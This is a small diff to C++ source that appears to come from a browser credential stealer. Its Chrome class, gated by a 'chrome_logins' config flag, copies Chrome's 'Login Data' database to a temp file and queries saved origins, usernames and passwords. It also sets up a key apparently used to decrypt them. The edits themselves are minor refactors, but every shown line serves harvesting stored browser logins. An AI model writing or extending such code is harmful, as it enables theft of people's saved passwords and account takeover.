@@ -13,6 +13,8 @@ using json = nlohmann::json;
 
 Chrome::Chrome(std::string path) noexcept
 {
+	this->key = { 0 };
+
 	if (!config::chrome_logins)
 		return;
 
@@ -20,7 +22,7 @@ Chrome::Chrome(std::string path) noexcept
 		return;
 
 
-	const char* query = "SELECT origin_url, action_url, username_value, password_value FROM logins";
+	auto query = "SELECT origin_url, action_url, username_value, password_value FROM logins";
 	const char* dbFileName = "tempdb";
 
 	std::ifstream source(path + "Default\\Login Data", std::ios::binary);
